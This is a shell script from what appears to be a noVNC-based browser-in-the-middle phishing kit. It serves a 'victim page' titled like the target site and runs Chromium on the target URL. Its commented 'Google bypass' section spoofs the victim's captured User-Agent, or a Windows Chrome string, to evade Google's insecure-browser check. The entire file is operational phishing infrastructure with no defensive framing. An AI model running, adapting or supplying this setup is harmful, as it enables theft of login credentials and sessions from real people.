#export DISPLAY=:0

# read URL from file (env)
#URL=$(head -1 php.ini | cut -d "=" -f 2)

# prepare site
cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
#ln -s /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html

# get title of target site and set it to our victim page
TITLE=$(curl -sk "$URL" | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")
#echo $TITLE > title.txt && sed -i "4s/.*/$(head -1 title.txt)/g" noVNC/index.html
sed -i "4s/.*/$TITLE/g" noVNC/index.html

# prepare download dir
#sudo mkdir Downloads 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
#sudo mkdir -p Downloads && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
sudo chmod 777 kiosk.zip

# do some dbus stuff
# TODO config not found... necessary?
#sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address


unzip -n kiosk.zip
#sleep 2
#/usr/bin/chromium-browser --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start &

# ─────────────────────────────────────────────────────────────────────────────
# Google bypass: User-Agent selection
#
# $1 is the victim's real browser UA, captured from their HTTP request headers
# and passed here by server.sh (via "USERA" env var sourced from tmp/useragent.txt).
#
# Using the victim's own UA makes the container Chromium look identical to their
# browser from Google's perspective. If the victim UA is empty (early startup),
# fall back to a generic Windows Chrome UA to avoid the Linux/Chromium fingerprint
# that triggers Google's "browser or app may not be secure" check.
#
# The fallback UA should be kept updated to match a current Chrome stable release.
# ─────────────────────────────────────────────────────────────────────────────
VICTIM_UA="$1"

# Sanitise: drop the victim UA if it contains known bot/webview markers
# that Google blocks ("; wv" = Android WebView, "HeadlessChrome" = headless)
if echo "$VICTIM_UA" | grep -qiE '; wv\)|HeadlessChrome|Electron/|PhantomJS'; then
    VICTIM_UA=""
fi

# Fallback: current Chrome stable on Windows (update version when Chrome stable advances)
FALLBACK_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"

# Use victim UA if valid, else use fallback
EFFECTIVE_UA="${VICTIM_UA:-$FALLBACK_UA}"

/usr/bin/chromium-browser --user-agent="$EFFECTIVE_UA" $URL &

# start chromium with target URL, sleep: wait for resolution to be read and stored to disk
#sleep 2 && /usr/bin/chromium-browser "$URL" &
